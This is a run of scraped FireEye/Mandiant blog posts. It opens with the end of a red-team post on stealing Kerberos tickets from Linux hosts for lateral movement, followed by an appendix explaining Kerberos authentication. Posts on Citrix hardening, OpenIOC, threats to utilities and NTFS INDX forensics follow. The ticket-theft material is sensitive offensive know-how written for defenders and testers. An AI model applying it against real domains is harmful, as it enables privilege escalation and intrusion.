  <br /> <span class="type-XS">Figure 4: Compromising domain controller
    with extracted tickets</span></p>
 <p>The <a href="https://github.com/fireeye/SSSDKCMExtractor">Python
    script and instructions</a> can be found on the FireEye Github.</p>
 <h4>Conclusion</h4>
 <p>By obtaining privileged access to a domain-joined Linux system, it
  is often possible to scrape Kerberos tickets useful for lateral
  movement. Although it is still common to find these tickets in the
  /tmp directory, it is now possible to also scrape these tickets from
  modern Linux systems that utilize the SSSD KCM.</p>
 <p>With the right Kerberos tickets, it is possible to move laterally to
  the rest of the Active Directory domain. If a privileged user
  authenticates to a compromised Linux system (such as a Domain Admin)
  and leaves a ticket behind, it would be possible to steal that user's
  ticket and obtain privileged rights in the Active Directory domain.</p>
 <h4>Appendix: Detailed Example of Kerberos Authentication in Active Directory</h4>
 <p>To illustrate how Kerberos works, we have selected a common scenario
  where a user John Smith with the account ACMENET.CORP\sa_jsmith wishes
  to authenticate to a Windows SMB (CIFS) file share in the Acme
  Corporation domain, hosted on the server SQLSERVER.ACMENET.CORP.</p>
 <p>There are two main types of Kerberos ticket types used in Active
  Directory: Ticket Granting Ticket (TGT) and service tickets. Service
  tickets are obtained from the Ticket Granting Service (TGS). The TGT
  is used to authenticate the identity of a particular entity in Active
  Directory, such as a user account. Service tickets are used to
  authenticate a user to a specific service hosted on a domain- joined
  system. A valid TGT can be used to request service tickets from the
  Key Distribution Center (KDC). In Active Directory environments, the
  KDC is hosted on a Domain Controller.</p>
 <p>When the user wants to authenticate to the remote file share,
  Windows first checks if a valid TGT is present in memory on the user's
  workstation. If a TGT isn't present, a new TGT is requested from the
  Domain Controller in the form of an AS-REQ request. To prevent
  password cracking attacks (<a
    href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">AS-REP
  Roasting</a>), by default, Kerberos Preauthentication is performed
  first. Windows creates a timestamp and encrypts the timestamp with the
  user's Kerberos key (Note: User Kerberos keys vary based on encryption
  type. In the case of RC4 encryption, the user's RC4 Kerberos key is
  directly derived from the user's account password. In the case of AES
  encryption, the user's Kerberos key is derived from the user's
  password and a salt based on the username and domain name). The domain
  controller receives the request and decrypts the timestamp by looking
  up the user's Kerberos key. An example AS-REQ packet is shown in
  Figure 5.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><img
          src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture5.png"
      alt="" /></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 5: AS-REQ</span></p>
 <p>Once preauthentication is successful, the Domain Controller issues
  an AS-REP response packet that contains various metadata fields, the
  TGT itself, and an &quot;Authenticator&quot;. The data within the TGT
  itself is considered sensitive. If a user could freely modify the
  content within the TGT, they could <a
    href="https://adsecurity.org/?p=1515">impersonate any user in the
  domain</a> as performed in the Golden Ticket attack. To prevent this
  from easily occurring, the TGT is encrypted with the long term
  Kerberos key stored on the Domain Controller. This key is derived from
  the password of the krbtgt account in Active Directory.</p>
 <p>To prevent users from impersonating another user with a stolen TGT
  blob, Active Directory’s Kerberos implementation uses session keys
  that are used for mutual authentication between the user, domain, and
  service. When the TGT is requested, the Domain Controller generates a
  session key and places it in two places: the TGT itself (which is
  encrypted with the krbtgt key and unreadable by the end user), and in
  a separate structure called the Authenticator. The Domain Controller
  encrypts the Authenticator with the user's personal Kerberos key.</p>
 <p>When Windows receives the AS-REP packet back from the domain
  controller, it caches the TGT ticket data itself into memory. It also
  decrypts the Authenticator with the user's Kerberos key and obtains a
  copy of the session key generated by the Domain Controller. Windows
  stores this session key in memory for future use. At this point, the
  user's system has a valid TGT that it can use to request service
  tickets from the domain controller. An example AS-REP packet is shown
  in Figure 6.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><img
          src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture6.png"
      alt="" /></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 6: AS-REP</span></p>
 <p>After obtaining a valid TGT for the user, Windows requests a service
  ticket for the file share service hosted on the remote system
  SQLSERVER.ACMENET.CORP. The request is made using the service's
  Service Principal Name (“SPN”). In this case, the SPN would be
  cifs/SQLSERVER.ACMENET.CORP. Windows builds the service ticket request
  in a TGS-REQ packet. Within the TGS-REQ packet, Windows places a copy
  of the TGT previously obtained from the Domain Controller. This time,
  the Authenticator is encrypted with the TGT session key previously
  obtained from the domain controller. An example TGS-REQ packet is
  shown in Figure 7.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><img
          src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture7.png"
      alt="" /></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 7: TGS-REQ</span></p>
 <p>Once the Domain Controller receives the TGS-REQ packet, it extracts
  the TGT from the request and decrypts it with the krbtgt Kerberos key.
  The Domain Controller verifies that the TGT is valid and extracts the
  session key field from the TGT. The Domain Controller then attempts to
  decrypt the Authenticator in the TGS-REQ packet with the session key.
  Once decrypted, the Domain Controller examines the Authenticator and
  verifies the contents. If this operation succeeds, the user is
  considered authenticated by the Domain Controller and the requested
  service ticket is created.</p>
 <p>The Domain Controller generates the service ticket requested for
  cifs/SQLSERVER.ACMENET.CORP. The data within the service ticket is
  also considered sensitive. If a user could manipulate the service
  ticket data, they could <a
    href="https://adsecurity.org/?p=1515">impersonate any user on the
    domain to the service</a> as performed in the Silver Ticket attack.
  To prevent this from easily happening, the Domain Controller encrypts
  the service ticket with the Kerberos key of the computer the user is
  authenticating to. All domain-joined computers in Active Directory
  possess a randomly generated computer account credential that both the
  computer and Domain Controller are aware of. The Domain Controller
  also generates a second session key specific to the service ticket and
  places a copy in both the encrypted service ticket and a new
  Authenticator structure. This Authenticator is encrypted with the
  first session key (the TGT session key). The service ticket,
  Authenticator, and metadata are bundled in a TGS-REP packet and
  forwarded back to the user. An example TGS-REP packet is shown in
  Figure 8.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><img
          src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture8.png"
      alt="" /></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 8: TGS-REP</span></p>
 <p>Once Windows receives the TGS-REP for cifs/SQLSERVER.ACMENET.CORP,
  Windows extracts the service ticket from the packet and caches it into
  memory. It also decrypts the Authenticator with the TGT specific
  session key to obtain the new service specific session key. Using both
  pieces of information, it is now possible for the user to authenticate
  to the remote file share. Windows negotiates a SMB connection with
  SQLSERVER.ACMENET.CORP. It places a Kerberos blob in an
  &quot;ap-req&quot; structure. This Kerberos blob includes the service
  ticket received from the domain controller, a new Authenticator
  structure, and metadata. The new Authenticator is encrypted with the
  service specific session key that was previously obtained from the
  Domain Controller. The authentication process is shown in Figure 9.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><img
          src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture9.png"
      alt="" /></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 9: Authenticating to SMB (AP-REQ)</span></p>
 <p>Once the file share server receives the authentication request, it
  first extracts and decrypts the service ticket from the Kerberos
  authentication blob and verifies the data within. It also extracts the
  service specific session key from the service ticket and attempts to
  decrypt the Authenticator with it. If this operation succeeds, the
  user is considered to be authenticated to the service. The server will
  acknowledge the successful authentication by sending one final
  Authenticator back to the user, encrypted with the service specific
  session key. This action completes the mutual authentication process.
  The response (contained within an “ap-rep” structure) is shown in
  Figure 10.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><img
          src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture10.png"
      alt="" /></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 10: Final Authenticator (Mutual
    Authentication, AP-REP)</span></p>
 <p>A diagram of the authentication flow is shown in Figure 11.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><img
          src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/kerberostickets/Picture11.png"
      alt="" /></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 11: Example Kerberos authentication flow</span></p>
http://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html2020-04-01T16:00:00.000Z2020-07-24T06:26:02.745ZCitrix XenApp and XenDesktop Hardening Guidancenoemail@noemail.orgTony Lee<h5>A Joint Whitepaper from Mandiant and Citrix</h5>
 <p>Throughout the course of <a
    href="/content/fireeye-www/en_US/services/red-team-operations.html">Mandiant’s
    Red Team</a> and <a
    href="/content/fireeye-www/en_US/mandiant/incident-response.html">Incident
  Response</a> engagements, we frequently identify a wide array of
  misconfigured technology solutions, including Citrix XenApp and XenDesktop.</p>
 <p>We often see attackers leveraging stolen credentials from third
  parties, accessing Citrix solutions, breaking out of published
  applications, accessing the underlying operating systems, and moving
  laterally to further compromise the environment. Our experience shows
  that attackers are increasingly using Citrix solutions to remotely
  access victim environments post-compromise, instead of using
  traditional backdoors, remote access tools, or other types of malware.
  Using a legitimate means of remote access enables attackers to blend
  in with other users and fly under the radar of security monitoring tools.</p>
 <p>Citrix provides extensive security hardening guidance and templates
  to their customers to mitigate the risk of these types of attacks. The
  guidance is contained in product-specific eDocs, Knowledge Base
  articles and detailed Common Criteria configurations. System
  administrators (a number of them wearing many hats and juggling
  multiple projects) may not have the time to review all of the
  hardening documentation available, so Mandiant and Citrix teamed up to
  provide guidance on the most significant risks posed to Citrix XenApp
  and XenDesktop implementations in a single white paper.</p>
 <p>This white paper covers risks and official Citrix hardening guidance
  for the following topics:</p>
 <ul> <li>Environment and Application Jailbreaking</li> <li>Network
    Boundary Jumping</li> <li>Authentication Weaknesses</li>
    <li>Authorization Weaknesses</li> <li>Inconsistent Defensive
  Measures</li> <li>Non-configured or Misconfigured Logging and
  Alerting</li> </ul>
 <p>
  <a
    href="https://www.citrix.com/content/dam/citrix/en_us/documents/products-solutions/system-hardening-for-xenapp-and-xendesktop.pdf"
    target="_blank">The white paper is available here.</a></p>
http://www.fireeye.com/blog/threat-research/2016/03/citrix_xenapp_andxe.html2016-03-15T12:00:00.000Z2020-07-24T06:26:02.748ZLeveraging the Power of Solutions and Intelligencenoemail@noemail.orgRichard Bejtlich<div class="c00 c00v1">
  <p>Welcome to my first post as a <a href="http://www.fireeye.com/"
    target="_blank">FireEye™</a> employee! Many of you have asked me
    what I think of FireEye's acquisition of Mandiant. One of the
    aspects of the new company that I find most exciting is our
    increased threat intelligence capabilities. This post will briefly
    explore what that means for our customers, prospects, and the
  public.</p> <p>By itself, Mandiant generates threat intelligence in a
    fairly unique manner from three primary sources. First, our <a
      href="/content/fireeye-www/en_US/mandiant/incident-response.html">professional
    services</a> division learns about adversary tools, tactics, and
    procedures (TTPs) by assisting intrusion victims. This &quot;boots
    on the ground&quot; offering is unlike any other, in terms of
    efficiency (a small number of personnel required), speed (days or
    weeks onsite, instead of weeks or months), and effectiveness (we
    know how to remove advanced foes). By having consultants inside a
    dozen or more leading organizations every week of the year, Mandiant
    gains front-line experience of cutting-edge intrusion activity.
    Second, the <a
      href="https://www.mandiant.com/products/managed-defense/"
      target="_blank">Managed Defense™</a> division operates our
    software and provides complementary services on a multi-year
    subscription basis. This team develops long-term counter-intrusion
    experience by constantly assisting another set of customers in a
    managed security services model. Finally, Mandiant's intelligence
    team acquires data from a variety of sources, fusing it with
    information from professional services and managed defense. The
    output of all this work includes deliverables such as the annual <a
      href="https://www2.fireeye.com/fireeye-mandiant-m-trends-report"
      target="_blank">M-Trends report</a> and last year's <a
      href="http://intelreport.mandiant.com/" target="_blank">APT1
    document</a>, both of which are free to the public. Mandiant
    customers have access to more intelligence through our software and
  services.</p> <p>As a security software company, <a
      href="http://www.fireeye.com/products-and-solutions/"
      target="_blank">FireEye deploys powerful appliances</a> into
    customer environments to inspect and (if so desired) quarantine
    malicious content. Most customers choose to benefit from the cloud
    features of the <a
      href="http://www.fireeye.com/products-and-solutions/"
      target="_blank">FireEye product suite</a>. This decision enables
    community self-defense and exposes a rich collection of the world's
    worst malware. As millions more instances of FireEye's MVX
    technology expand to mobile, cloud and data center environments, all
    of us benefit in terms of protection and visibility. Furthermore,
    FireEye's own threat intelligence and services components generate
    knowledge based on their visibility into adversary software and
    activity. Recent examples include breaking news on Android malware,
    identifying Yahoo! systems serving malware, and exploring
    &quot;cyber arms&quot; dealers. Like Mandiant, FireEye's customers
    benefit from intelligence embedded into the MVX platforms.</p>
    <p>Many have looked at the Mandiant and FireEye combination from the
    perspective of software and services. While these are important,
    both ultimately depend on access to the best threat intelligence
    available. As a combined entity, FireEye can draw upon nearly 2,000
    employees in 40 countries, with a staff of security consultants,
    analysts, engineers, and experts not found in any other private
    organization. Stay tuned to the FireEye and Mandiant blogs as we
    work to provide an integrated view of adversary activity throughout
  2014.</p> <p>I hope you can attend the FireEye + Mandiant - 4 Key
    Steps to Continuous Threat Protection webinar on Wednesday, Jan 29
    at 2pm ET. During the webinar Manish Gupta, FireEye SVP of Products,
    and Dave Merkel, Mandiant CTO and VP of Products will discuss why
    traditional IT security defenses are no longer the safeguards they
    once were and what's now needed to protect against today's advanced
  threats.</p> </div>
http://www.fireeye.com/blog/threat-research/2014/01/leveraging-power-solutions-intelligence.html2014-01-27T20:40:15.000Z2020-07-24T06:26:02.741ZThe History of OpenIOCnoemail@noemail.orgDoug Wilson<div class="c00 c00v1">
  <p>With the buzz in the security industry this year about sharing
    threat intelligence, it's easy to get caught up in the hype, and
    believe that proper, effective sharing of Indicators or Intelligence
    is something that can just be purchased along with goods or services
    from any security vendor.</p> <p>It's really a much more complex
    problem than most make it out to be, and one that we've been working
    on for a while. A large part of our solution for managing Threat
    Indicators is using the <a href="http://www.openioc.org/"
    target="_blank">OpenIOC</a> standard format.</p> <p>Since its
    founding, Mandiant sought to solve the problem of how to conduct
    leading-edge <a
      href="/content/fireeye-www/en_US/mandiant/incident-response.html"
      target="_blank">Incident Response</a> (IR) - and how to scale that
    response to an entire enterprise. We created OpenIOC as an early
    step in tackling that problem. Mandiant released OpenIOC to the
    public as an Open Source project under the Apache 2 license in
    November of 2011, but OpenIOC had been used internally at Mandiant
    for several years prior.</p> <p>IR is a discipline that usually
    requires highly trained professionals doing very resource-intensive
    work. Traditionally, these professionals would engage in
    time-intensive investigations on only a few hosts on a compromised
    network. Practical limitations on staffing, resources, time, and
    money would prevent investigations from covering anything other than
    a very small percentage of most enterprises. Responders would only
    be able to examine what they had direct access to, with their
    corresponding conclusions constrained by time and budget.</p>
    <p>This level of investigation was almost never enough to give
    confidence on anything other than the hosts that had been examined -
    responders were unable to confirm whether other systems were still
    compromised, or whether the adversary still had footholds in other
    parts of the network.</p> <p>Creating a standard way of recording
    Threat Intelligence into an Indicator was part of what allowed
    Mandiant to bring a new approach to IR, including the use of an
    automated solution, such as <a
      href="https://www.mandiant.com/products/mandiant-platform/intelligent-response"
      target="_blank">Mandiant for Intelligent Response® (MIR®)</a>.
    Mandiant's new strategy for IR enabled investigators, who previously
    could only get to a few hosts in an engagement, to now query entire
    enterprises in only slightly more time. Using OpenIOC as a
    standardized format, the Indicators of Compromise (IOCs) were
    recorded once, and then used to help gather the same information and
    conduct the same testing on every host across the enterprise via the
    automated solution. Incident Responders could now spend only a
    little more time, but cover an exponentially larger number of hosts
    during the course of an investigation.</p> <p>Recording the IOCs in
    OpenIOC had other benefits as well. Indicators from one
    investigation could be shared with other investigations or
    organizations, and allow investigators to look for the exact same
    IOCs wherever they were, without having to worry about translation
    problems associated with ambiguous formats, such as lists or text
    documents. One investigator could create an IOC, and then share it
    with others, who could put that same IOC into their investigative
    system and look for the same evil as the first person, with little
    to no additional work.</p> <p>The format grew organically over time.
    We always intended that the format be expandable and improvable.
    Instead of trying to map out every possible use case, Mandiant has
    updated the format and expanded the dictionaries of IOC Terms as new
    needs have arisen over time. The version we released in 2011 as
    &quot;1.0&quot; had already been revised and improved upon
    internally several times before its Open Source debut. We continue
    to update the standard as needed, allowing for features and requests
    that we have received over time from other users or interested
  parties.</p> <p>Unlike traditional &quot;signatures,&quot; OpenIOC
    provides the ability to use logical comparison of Indicators in an
    IOC, providing more flexibility and discrimination than simple lists
    of artifacts. An extensive library of <a
      href="http://openioc.org/terms/Common.iocterms"
      target="_blank">Indicator Terms</a> allows for a variety of
    information from hosts and networks to be recorded, and if something
    is not covered in the existing terms, additional terms may be added.
    Upcoming features like parameters will allow for further expansion
    of the standard, including customization for application or
    organization specific use cases.</p> <p>Having the OpenIOC standard
    in place is tremendously powerful, providing benefits for scaling
    detection and investigation, both of which are key parts of managing
    the threat lifecycle. OpenIOC enables easy, standardized information
    sharing once implemented, without adding much to workloads or
    draining resources. And it is freely available as Open Source; so
    that others can benefit from some of the methods we have already
    found to work well in our practice. We hope that as we improve it,
    you can take even more advantage of what OpenIOC has to offer in
    your IR and Threat Intelligence workflows.</p> <p>Next up in the <a
      href="https://www.mandiant.com/blog/basics-series-openioc/"
      target="_blank">Back to Basics: OpenIOC</a> series, we'll talk
    about some of the basics of what OpenIOC is and what using it
    involves - and some of the upcoming things in the future of
  OpenIOC.</p> </div>http://www.fireeye.com/blog/threat-research/2013/09/history-openioc.html2013-09-17T23:36:51.000Z2020-07-24T06:26:02.746ZUtilities Industry in the Cyber Targeting Scopenoemail@noemail.orgIntel Team<div class="c00 c00v1">
  <p>There's often a lot of rhetoric in the press and in the security
    community around threats to the utilities industry, and risk
    exposure surrounding critical infrastructure. We've determined that
    the utilities industry (power, water, waste) has been, and likely
    will continue to be, a target for cyber espionage primarily from
    Chinese APT groups. We also anticipate that U.S. utilities
    infrastructure is vulnerable to computer network attack (CNA) from a
    variety of threat actors motivated by a desire to disrupt, deny
    access, or destroy. It's important to recognize the difference
    between actors seeking to steal data or intellectual property, and
    actors seeking to destroy systems or cause mass destruction. Often
    the distinction between computer network exploitation (CNE) and CNA
    gets lost in media coverage that bundles diverse cyber activity
    together. The type of cyber activity has implications for how we
    tackle the problem, thus it's key to distinguish.</p> <p>As part of
      our<a
      href="/content/fireeye-www/en_US/mandiant/incident-response.html"
      target="_blank"> incident response</a> and <a
      href="https://www.mandiant.com/products/managed-defense/"
      target="_blank">managed defense</a> work, Mandiant has observed
    Chinese APT groups exploiting the computer networks of U.S.
    utilities enterprises servicing or providing electric power to U.S.
    consumers, industry, and government.  The most likely targeted
    information for data theft in this industry includes smart grid
    technologies, water and waste management expertise, and negotiations
    information related to existing or pending deals involving Western
    utilities companies operating in China.</p> <h3>Why would Chinese
    APT Groups Seek to Exploit Utilities?</h3>
  <p>Since 2010, Mandiant has responded to what we assessed were Chinese
    cyber espionage incidents occurring at multiple utilities companies
    involved in electric power generation.  We recognize the PRC's
    utilities sector for electric power development, construction,
    operations, and distribution is heavily concentrated on a select few
    state-owned enterprises (SOE) with close ties to the central
    government. We suspect these relationships provide APT groups with a
    fundamental incentive to conduct espionage to attain advanced
    technology and operations expertise.</p> <p>By way of possible
    motivation, the PRC is in the midst of a historic makeover that
    involves the transformation of urban infrastructures, which, by
    2025, is likely to produce 15 mega-cities with an average of 25
    million inhabitants, or about the entire population of the United
      States.<a title="">[i]</a> The impacts from this transition are
    intensifying pressures on an already fragile and outdated utilities
    infrastructure in China that currently struggles to provide
    sufficient electric power, water, and waste treatment. We believe
    APT groups are stealing data that will allow them to improve
    historic PRC urbanization efforts and the modernization of
    infrastructure, which is receiving billions of government investment
    dollars for development.</p> <p>While we have tracked multiple
    attributed Chinese APT groups active in the utilities industries, we
    certainly don't discount that other, non-Chinese state-sponsored (or
    independent) actors could be engaged in data theft related to
  utilities.</p> <h3>The Risk of Disruptive Cyber Attacks</h3>
  <p>Computer network attacks (CNA) - that is, offensive cyber
    operations meant to disrupt or destroy-are also a threat to the
    utilities industry from state actors in times of major conflict.
    Perpetrators may include hostile adversaries, possibly
    nation-states, during times of escalated tensions, or terrorist
    operatives who gain the required expertise. The threat of a
    state-sponsored actor or proxy targeting this industry using CNA is
    a growing concern, particularly in the case of Iran, though
    wide-scale data theft is the primary type of threat we've observed
    to this point. Several large US news outlets did recently report
    that Iranian-based actors infiltrated some of the US' industrial
    control systems, however, and some have speculated their motivation
    in doing so was to map the network or identify resources for future
    attack scenarios.</p> <p>For more intelligence reporting and
    specific details related to data theft in the utilities industry,
    the involved actors, and other threats, consider subscribing to the
      <a href="https://www.mandiant.com/products/intelligence-center/"
      target="_blank">Mandiant Intelligence Center</a>.</p> </div>http://www.fireeye.com/blog/threat-research/2013/06/utilities-industry-cyber-targeting-scope.html2013-06-17T20:40:56.000Z2020-07-24T06:26:02.739ZIncident Response with NTFS INDX Buffers – Part 1: Extracting an INDX Attributenoemail@noemail.orgWilliam Ballenthin<div class="c00 c00v1">
  <p>By William Ballenthin &amp; Jeff Hamm</p> <p>On August 30, 2012, we
    presented a <a
    href="http://www.mandiant.com/events/webinar/fresh-prints-of-mal-ware-striking-gold-in-incident-response-with-ntfs-indx-">webinar</a>
    on how to use INDX buffers to assist in an<a
      href="/content/fireeye-www/en_US/mandiant/incident-response.html">
      incident response</a> investigation. During the Q&amp;A portion of
    the webinar we received many questions; however, we were not able to
    answer all of them. We're going to attempt to answer the remaining
    questions by posting a four part series on this blog. This series
    will address:</p> <ul> <li>
      <strong>Part 1: Extracting an INDX Attribute</strong></li> <li>
      <a
        href="/content/fireeye-www/en_US/blog/threat-research/2012/09/incident-response-ntfs-indx-buffers-part-2-internal.html">Part
        2: The Internal Structures of a File Name Attribute</a></li> <li>
      <a
        href="/content/fireeye-www/en_US/blog/threat-research/2012/10/incident-response-ntfs-indx-buffers-part-3-step-step-guide.html">Part
        3: A Step by Step Guide to Parse INDX</a></li> <li>
      <a
        href="/content/fireeye-www/en_US/blog/threat-research/2012/10/incident-response-ntfs-indx-buffers-part-4-br-internal.html">Part
        4: The Internal Structures of an INDX Structure</a></li> </ul>
    <h4>Part 1: Extracting an INDX Record</h4> <p>An INDX buffer in the
    NTFS file system tracks the contents of a folder. INDX buffers can
    be resident in the $MFT (Master File Table) as an index root
    attribute (attribute type 0x90) or non-resident as an index
    allocation attribute (attribute 0xA0) (non-resident meaning that the
    content of the attribute is in the data area on the volume.)</p>
    <p>INDX root attributes have a dynamic size in the MFT, so as the
    contents change, the size of the attributes change. When an INDX
    root attribute shrinks, the surrounding attributes shift and
    overwrite any old data. Therefore, it is not possible to recover
    slack entries from INDX root attributes. On the other hand, the file
    system driver allocates INDX allocation attributes in multiples of
    4096, even though the records may only be 40 bytes. As file system
    activity adds and removes INDX records from an allocation attribute,
    old records may still be recoverable in the slack space found
    between the last valid entry and the end of the 4096 chunk. This is
    very interesting to a forensic investigator. Fortunately, many
    forensic tools support extracting the INDX allocation attributes
    from images of an NTFS file system.</p> <h4>Scenario</h4> <p>Let's
    say that during your investigation you identified a directory of
    interest that you want to examine further. In the scenario we used
    during the webinar, we identified a directory as being of interest
    because we did a keyword search for &quot;1.rar&quot;. The results
    of the search indicated that the slack space of an INDX attribute
    contained the suspicious filename &quot;1.rar&quot;. The INDX
    attribute had the $MFT record number 49.</p> <p>Before we can parse
    the data, we need to extract the valid index attribute's content.
    Using various forensic tools, we are capable of this as demonstrated
  below.</p> <h4>The SleuthKit</h4> <p>We can use the SleuthKit tools to
    extract both the INDX root and allocation data. To extract the INDX
    attribute using the SleuthKit, the first step is to identify the
    $MFT record IDs for the attributes of the inode. We want the content
    of the index root attribute (attribute type 0x90 or 144d) and the
    index allocation attribute (attribute type 0xA0 or 160d).</p> <p>To
    identify the attribute IDs, run the command:</p> <p>
    <code>istat -f ntfs ntfs.dd 49</code></p> <p>The istat command
    returns inode information from the $MFT. In the command we are
    specifying the NTFS file system with the &quot;-f&quot; switch. The
    tool reads a raw image named &quot;ntfs.dd&quot; and locates record
    number 49. The result of our output (truncated) was as follows:</p> <p>
    <code>....<br />  Attributes:<br />  Type: $STANDARD_INFORMATION
      (16-0) Name: Resident size: 72</code></p> <p>...</p> <p>Type: $I30
    (144-6) Name: $I30 Resident size: 26</p> <p>Type: $I30 (160-7) Name:
    $I30 Non-Resident size: 4096</p> <p>The information returned for the
    attribute list includes the index root - $I30 (144-6) - and an index
    allocation - $I30 (160-7). The attribute identifier is the integer
    listed after the dash. Therefore, the index root attribute 144 has
    an identifier of 6, and the index allocation attribute 160 has an
    identifier of 7.</p> <p>With this information, we can gather the
    content of the attributes with the SleuthKit commands:</p> <p>
    <code>icat -f ntfs ntfs.dd 49-144-6 &gt; INDX_ROOT.bin</code></p> <p>
    <code>icat -f ntfs ntfs.dd 49-160-7 &gt;
  INDX_ALLOCATION.bin</code></p> <p>The icat command uses the NTFS
    module to identify the record (49) attribute (144-6 and 144-7), and
    outputs the attribute data into the respective files INDX_ROOT.bin
    and INDX_ALLOCATION.bin.</p> <h4>EnCase</h4> <p>We can use EnCase to
    extract the INDX allocation data. To use EnCase version 6.x to
    gather the content of the INDX buffers, in the explorer tree, right
    click the folder icon. The &quot;Copy/UnErase...&quot; option
    applied to a directory will copy the content of the INDX buffer as a
    binary file. Specify a location to save the file. Note that the
    &quot;Copy Folders...&quot; option will copy the directory and its
    contents and will NOT extract the INDX structure.</p> <p>
    <a
        href="https://www.fireeye.com/content/dam/legacy/ammo/Copy_UnErase_Pic-1.png"><img
        class="alignnone size-full wp-image-3267" title="Copy/UnErase"
        src="https://www.fireeye.com/content/dam/legacy/ammo/Copy_UnErase_Pic-1.png"
        width="379" height="88" /></a></p> <h4>FTK</h4> <p>We can use
    the Forensic Toolkit (FTK) to extract the INDX allocation data.
    Using FTK or FTK Imager, the INDX allocation attributes appear in
    the file list pane. These have the name &quot;$I30&quot; because the
    stream name is identified as $I30 in the index root and index
    allocation attributes. To extract the content of an index attribute,
    in the explorer pane, highlight the folder. In the file list pane,
    right click the relevant $I30 file and choose the option to
    &quot;export&quot;. This will prompt you for a location to save the
    binary content.</p> <p>
    <a
        href="https://www.fireeye.com/content/dam/legacy/ammo/File-List_Pic-2.png"><img
        class="alignnone size-full wp-image-3268" title="File List"
        src="https://www.fireeye.com/content/dam/legacy/ammo/File-List_Pic-2.png"
        width="484" height="58" /></a></p> <h4>Mandiant Intelligent
  Response<sup>®</sup></h4> <p>The Mandiant Intelligent
    Response<sup>®</sup> (MIR) agent v.2.2 has the ability to extract
    INDX records natively. To generate a list of INDX buffers in MIR,
    run a RAW file audit. One of the options in the audit is to
    &quot;Parse NTFS INDX Buffers&quot;. You can run this recursively,
    or you can target specific directories. We recommend the latter
    because this option will generate numerous entries when done
  recursively.</p> <p>
    <a
        href="https://www.fireeye.com/content/dam/legacy/ammo/Figure-2_Parse-NTFS-INDX-Buffers-Option.png"><img
        class="alignnone size-full wp-image-3431"
        title="Parse NTFS INDX Buffers Option"
        src="https://www.fireeye.com/content/dam/legacy/ammo/Figure-2_Parse-NTFS-INDX-Buffers-Option.png"
        width="559" height="228" /></a></p> <p>To display a list of
    parsed INDX buffers, you can filter a file listing in MIR by
    choosing the &quot;FileAttributes&quot; are &quot;like&quot;
    &quot;*INDX*&quot;. The MIR agent recognizes &quot;INDX&quot; as an
    attribute because the files listed in the indices may or may not be
  deleted.</p> <h4>
    <a
        href="https://www.fireeye.com/content/dam/legacy/ammo/Figure-3_Filtering-in-MIR-for-INDX-Buffers.png"><img
        class="alignnone size-full wp-image-3432"
        title="Filtering in MIR for INDX Buffers"
        src="https://www.fireeye.com/content/dam/legacy/ammo/Figure-3_Filtering-in-MIR-for-INDX-Buffers.png"
        width="427" height="158" /></a></h4> <h4>Results</h4>
    <p>Regardless of which method is used, your binary file should begin
    with the string &quot;INDX&quot; if you grabbed the correct data
    stream. You can verify the results quickly in a hex editor. Ensure
    that the first four bytes of the binary data is the string
  &quot;INDX&quot;.</p> <p>
    <a
        href="https://www.fireeye.com/content/dam/legacy/ammo/Binary-Data_Pic-3.png"><img
        class="alignnone size-full wp-image-3269" title="Binary File"
        src="https://www.fireeye.com/content/dam/legacy/ammo/Binary-Data_Pic-3.png"
        width="763" height="750" /></a></p> <h4>Conclusion</h4> <p>This
    example demonstrates three ways to use various tools to extract INDX
    attribute content. Our next post will detail the internal structures
    of a file name attribute. A file name attribute will exist for each
    file tracked in a directory. These structures include the MACb
    (Modified, Accessed, Changed, and birth) times of a file and can be
    a valuable timeline source in an investigation.</p> </div>
http://www.fireeye.com/blog/threat-research/2012/09/striking-gold-incident-response-ntfs-indx-buffers-part-1.html2012-09-18T23:23:24.000Z2020-07-24T06:26:02.740ZM-Trends #1: Malware Only Tells Half the Storynoemail@noemail.orgGrady Summers<div class="c00 c00v1">
  <p>When I joined Mandiant earlier this year, I was given the
    opportunity to help write our annual <a
      href="https://www2.fireeye.com/WEB-2012-MNDT-RPT-M-Trends-2012_LP.html">M-Trends
    report</a>. This is the third year Mandiant has published the
    report, which is a summary of the trends we've observed in our
    investigations over the last twelve months.</p> <p>I remember
    reading Mandiant's <a
      href="https://www2.fireeye.com/WEB-2010-MNDT-RPT-M-Trends-2010_LP.html">first
      M-Trends report</a> when it came out in 2010 and recall being
    surprised that Mandiant didn't pull any punches. They talked about
    the advanced persistent threat or APT (they had been using that term
    for several years...long before it was considered a cool marketing,
    buzz word), and they were open about the origin of the attacks. The
    report summarized what I'd been seeing in industry, and offered
    useful insights for detection and response. Needless to say, I
    enjoyed the opportunity to work on the latest version.</p> <p>In
    this year's report it details six trends we identified in 2011. We
    developed the six trends for the report very organically. That is, I
    spent quite a few days and nights reading all of the reports from
    our outstanding incident response team and wrote about what we
    saw-we didn't start with trends and then look for evidence to
    support them.</p> <p>If you haven't picked up a copy of the report
    yet, you can do so <a
    href="https://www2.fireeye.com/WEB-2012-MNDT-RPT-M-Trends-2012_LP.html">here</a>.
